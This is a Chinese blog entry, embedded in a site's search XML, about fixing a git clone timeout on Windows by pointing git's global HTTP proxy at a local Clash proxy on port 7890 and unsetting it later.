        <content type="html"><![CDATA[<p>git工具虽然好，但是其实我觉得挺难用的，总是会遇到一些奇奇怪怪的问题。</p><span id="more"></span><h2 id="Git-clone连接超时"><a href="#Git-clone连接超时" class="headerlink" title="Git clone连接超时"></a>Git clone连接超时</h2><p>环境：win10，使用了梯子在git bash下进行<code>git clone</code>，结果报错：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fatal: unable to access <span class="string">&#x27;https://github.com/xxx.git/&#x27;</span>: Failed to connect to github.com port 443: Timed out</span><br></pre></td></tr></table></figure><p>解决方法：配置git的代理。我使用的梯子是clash for windows，在<code>Genaral</code>栏中能查看代理端口为7890.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy <span class="string">&quot;127.0.0.1:7890&quot;</span></span><br><span class="line">git config --global http.proxy <span class="string">&quot;127.0.0.1:7890&quot;</span></span><br></pre></td></tr></table></figure><p>配置完后，梯子要使用开着，再使用<code>git clone</code>就没有问题了。</p><p>如果要关闭梯子的话，就需要取消代理啦：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
